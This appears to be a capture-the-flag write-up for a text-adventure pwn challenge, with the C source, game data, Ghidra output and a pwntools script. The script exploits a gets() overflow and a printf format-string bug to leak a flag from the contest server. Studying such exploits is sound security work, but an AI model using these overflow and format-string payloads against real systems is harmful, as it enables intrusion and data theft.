### Problem description ###
For this challenge, we are given 4 files, a ```game.dat``` file, a C source file, and a binary and a libc. In order to patch the binary to use the appropriate libc we run ```pwninit``` with the libc and the binary in the same folder.

The source code is
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_LOCATIONS 32
#define MAX_CHOICES 4
#define MAX_STRING 1024

typedef struct _choice choice;
typedef struct _location location;

typedef struct _choice {
    char description[MAX_STRING]; // Description of the choice
    location *location;           // Where to go when this choice is chosen
} choice;

typedef struct _location {
    char description[MAX_STRING]; // Description of the location
    choice choices[MAX_CHOICES];  // List of choices
    int num_choices;              // Number of choices
    int end_location;             // Whether the game should end when reaching this location (0 or 1)
} location;

typedef struct _game {
    location *current_location;
    char input_buf[MAX_STRING];
    location locations[MAX_LOCATIONS];
} game;

void load_game(game *g) {
    int num_locations = 0;
    int index = 0;

    // Open file to read
    FILE *game_file = fopen("./game.dat", "r");
    // Read how many locations there are
    fscanf(game_file, "%d\n", &num_locations);

    for (int i = 0; i < num_locations; ++i) {
        // Read index of this room
        fscanf(game_file, "%d ", &index);
        // Read description of this room
        fgets(g->locations[index].description, MAX_STRING, game_file);
        // Read number of choices
        fscanf(game_file, "%d\n", &g->locations[index].num_choices);
        for (int j = 0; j < g->locations[index].num_choices; ++j) {
            int location_index = 0;
            fscanf(game_file, "%d ", &location_index);
            g->locations[index].choices[j].location = &g->locations[location_index];
            fgets(g->locations[index].choices[j].description, MAX_STRING, game_file);
        }
        // Read value for end_location
        fscanf(game_file, "%d\n", &g->locations[index].end_location);
    }
    fclose(game_file);
    g->current_location = &g->locations[0];
}

void print_intro() {
	puts("  _____ _   _ _____    ____  _   _ _______     _______ ____  __  __ ");
	puts(" |_   _| \\ | |_   _|  / __ \\| \\ | |__   __|   / / ____/ __ \\|  \\/  |");
	puts("   | | |  \\| | | |   | |  | |  \\| |  | |     / /| (___| |  | | \\  / |");
	puts("   | | | . ` | | |   | |  | | . ` |  |_|    / /_ \\___ \\|_|__|_|_|\\/|_|");
	puts("  _| |_| |\\ _|_| |_ _|_|__|_|_|\\__|_______/_____|_____)_____(_)__/ (_)");
	puts(" |_(_)___(_)_____/(_)_/ (_)_____(_)_____/_____(_)_____/_____(_)_/ (_)");
	puts("");
	puts("THE QUEST FOR THE GOLDEN BANANA");
	puts("A text-based adventure game by Bing");
	puts("");
	puts("Description of the ascii art:");
	puts("The ascii art represents a monkey holding a banana in its hand. The monkey is smiling and has a crown on its head. The banana is golden and has a star on it. The ascii art is meant to convey the theme and goal of the game.");
	puts("");
}

void print_location(location *l) {
    printf(l->description);
    if (l->end_location) {
        exit(0);
    }
    for (int i = 0; i < l->num_choices; ++i) {
        printf("%d: %s", i + 1, l->choices[i].description);
    }
}


int find_match(char *input, choice array[], int size) {
  for (int i = 0; i < size; i++) {
    if (strncmp(input, array[i].description, strlen(input)) == 0) {
      return i;
    }
  }
  // Return -1 if no match is found
  return -1;
}

int main() {
    game g = {};
    int choice = -1;

	print_intro();
    load_game(&g);

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    while (1) {
        // Print current location
        print_location(g.current_location);
        do {
            // Get choice from user
            gets(g.input_buf);
            // Allow either specifying the number or typing the description
            choice = atoi(g.input_buf) - 1;
            if (choice < 0 || choice >= g.current_location->num_choices) {
                choice = find_match(g.input_buf, g.current_location->choices, g.current_location->num_choices);
            }
            if (choice == -1) {
                printf("Invalid choice, please try again.\n");
            }
        } while (choice == -1);
		g.current_location = g.current_location->choices[choice].location;
    }
    return 0;
}
```
The code reads contents from ```game.dat```, and creates a structure. The contents of ```game.dat``` looks like this
```
16
0 You are a monkey who lives in the jungle. You have heard stories about a golden banana that grants incredible powers to whoever eats it. You want to find this banana and become the king of the jungle. What do you do?
2
1 Go north
2 Go south
0
1 You go north and encounter a river. The river is wide and deep, but you see a vine hanging from a tree on the other side. You think you can swing across the river using the vine. Do you try it?
2
3 Yes, swing across
4 No, go back
0
2 You go south and encounter a snake. The snake is long and venomous, but you see a shiny object in its mouth. It looks like a key. You think you can grab the key from the snake's mouth. Do you try it?
2
5 Yes, grab the key
4 No, go back
0
3 You swing across the river using the vine. You land safely on the other side and see a cave entrance. You wonder if the golden banana is inside the cave. Do you enter it?
2
6 Yes, enter the cave
4 No, swing back
0
4 You decide to go back to where you started. Maybe there is another way to find the golden banana. What do you do?
2
1 Go north
2 Go south
0
5 You grab the key from the snake's mouth. The snake hisses and bites your hand. You feel a sharp pain and start to lose consciousness. You drop the key and fall to the ground. This is not how your quest ends... or is it? GAME OVER
0
1
6 You enter the cave and see a torch on the wall. You take it and explore deeper into the cave. You hear strange noises and smell something rotten. Do you continue?
2
7 Yes, continue
8 No, turn back
0
7 You continue deeper into the cave and reach a large chamber with an altar in the center. On top of the altar, you see it: THE GOLDEN BANANA! It glows with an unearthly light and beckons you to come closer.
3
9 Take it
10 Leave it alone
11 Use your torch to burn it
0
8 You turn back and run out of the cave as fast as you can. As soon as you exit, you see an army of monkeys waiting for you outside. They are led by King Konga, who claims to be your long-lost brother. He says he knows about your quest for the golden banana and wants to help you find it. He says he has a map that shows where the banana is hidden. He says he will give you the map if you join his army and help him conquer the jungle. Do you accept his offer?
2
12 Yes, join him
13 No, refuse him
0
9 You take THE GOLDEN BANANA from the altar. As soon as you touch it, you feel a surge of power coursing through your veins. You feel stronger, smarter, and faster than ever before. You also feel hungry, so hungry that you can't resist taking a bite out of THE GOLDEN BANANA. It tastes more delicious than anything you have tasted ever before. You eat more, and more, until there is nothing left. You have eaten THE GOLDEN BANANA. You have become THE GOLDEN MONKEY. You have won. CONGRATULATIONS! YOU HAVE FOUND THE GOLDEN BANANA AND BECOME THE KING OF THE JUNGLE!
0
1
10 You leave THE GOLDEN BANANA alone on the altar. You realize that some things are better left untouched, and that power comes with a price. You decide to live peacefully in harmony with nature, and respect all living things. You have learned an important lesson. You have won. CONGRATULATIONS! YOU HAVE RESISTED THE TEMPTATION OF THE GOLDEN BANANA AND BECOME A WISE MONKEY!
0
1
11 You use your torch to burn THE GOLDEN BANANA on the altar.  As soon as you light it on fire, you hear an angry roar coming from behind you.  It's King Konga!  He followed you into the cave, and he's furious that you destroyed his precious golden banana. He says he was planning to use it to become the king of the jungle, and that you have ruined his dreams. He says he will make you pay for your betrayal. He attacks you with his fists and teeth. Do you fight back or run away?
2
14 Fight back
8 Run away
0
12 You accept King Konga's offer and join his army. He leads you and his troops through the jungle, conquering every tribe and village in their path. You become a powerful warlord and help King Konga become the king of the jungle. You have won. CONGRATULATIONS! YOU HAVE BECOME A POWERFUL WARLORD AND HELPED KING KONGA BECOME THE KING OF THE JUNGLE!
0
1
13 You refuse King Konga's offer and tell him to leave you alone. He gets angry and charges at you, but you dodge his attack and run away. You hide in the jungle for days, evading his troops and living off the land. Eventually, you make your way out of the jungle and find a safe place to rest. You have learned an important lesson. You have won. CONGRATULATIONS! YOU HAVE ESCAPED KING KONGA AND BECOME AN INDEPENDENT MONKEY!
0
1
14 You fight back against King Konga with your torch and claws. You are brave and strong, but he is bigger and stronger. He overpowers you and pins you to the ground. He raises his fist to deliver the final blow. This is not how your quest ends... or is it? GAME OVER
0
1
15 SECRET ROOM: dam{REDACTED} (server has the real flag)
0
1
```
The first line has the number of stages, then each line has a description and number of options n, available from that stage. The next n lines contain a number and description, number denoting the next stage the game will jump to and finally another number which indicates whether the game ends here. For instance, these lines
```
2 You go south and encounter a snake. The snake is long and venomous, but you see a shiny object in its mouth. It looks like a key. You think you can grab the key from the snake's mouth. Do you try it?
2
5 Yes, grab the key
4 No, go back
0
```
Indicate that in stage 2 there are 2 options, the first leads to stage 5 and the other to stage 4 and the 0 indicates that this is not an end stage.


### Approach ###

In this code, we have two vulnerabilities, an overflow in ```gets(g.input_buf);``` and a format string in ```printf(l->description);```. On seeing the code's disassembly in ghidra, we see the following
```
  do {
    *(undefined8 *)(puVar3 + -0x1928) = 0x1017e7;
    print_location(location);
    while( true ) {
      *(undefined8 *)(puVar3 + -0x1928) = 0x1017ff;
      gets(acStack_28910);
      *(undefined8 *)(puVar3 + -0x1928) = 0x101812;
      iStack_2891c = atoi(acStack_28910);
      iStack_2891c = iStack_2891c + -1;
      if ((iStack_2891c < 0) || (*(int *)(location + 0x1420) <= iStack_2891c)) {
        uVar1 = *(undefined4 *)(location + 0x1420);
        *(undefined8 *)(puVar3 + -0x1928) = 0x101869;
        iStack_2891c = find_match(acStack_28910,location + 0x400,uVar1);
      }
      if (iStack_2891c != -1) break;
      *(undefined8 *)(puVar3 + -0x1928) = 0x101887;
      puts("Invalid choice, please try again.");
    }
    location = *(long *)((long)iStack_2891c * 0x408 + location + 0x800);
  } while( true );
}
```
So whatever value is returned by ```find_match```, that value is multiplied by ```0x408``` and that resulting value is added to some base location and ```0x800``` to get the final location, which gets passed to ```print_location```. Since there is an overflow in the stack, we are able to control the parameters that get passed to ```strncmp``` inside find match, and we see that we are able to overflow the description string that is stored in the stack. Also the flag string is located somewhere in the stack. So what we do is we overflow the description of the first stage, and insert some format string specifiers that that leak the flag values. Now the next part is to return such a value from ```find_match```,that gives us our format string's location for the next printf.

Using gdb, we find that if we return the value ```0x14``` or ```20``` from ```find_match```, we are able to printout our format string.

### Exploit ###

```
from pwn import *

p = remote("chals.damctf.xyz", 30234)
context.terminal = ["tmux", "splitw", "-h"]
gdbscript = """
    br *main+29
    br find_match
"""
payload = b"Go north\x00" + cyclic(6176 - 9) + p64(21)
for i in range(200):
    payload += b"%" + str(9818+i).encode() + b"$p|"
p.sendline(payload)
p.recvuntil(b"2: Go south\n")
out = "".join(p.recvline().decode().split(":")[:-1])
out = out.split("|")
ans = []
for val in out:
    try:
        ans.append(p64(int(val, 16)).decode())
    except:
        break
print("".join(ans))
p.interactive()
```

In this exploit, we first overflow the size parameter that gets passed in ```find_match```, that is located at an offset of 6176 from our buffer. In order to return ```0x14```, I found that the string needs to be ```Go north\x00``` and the flag is located as an argument 9818 and so on in the stack.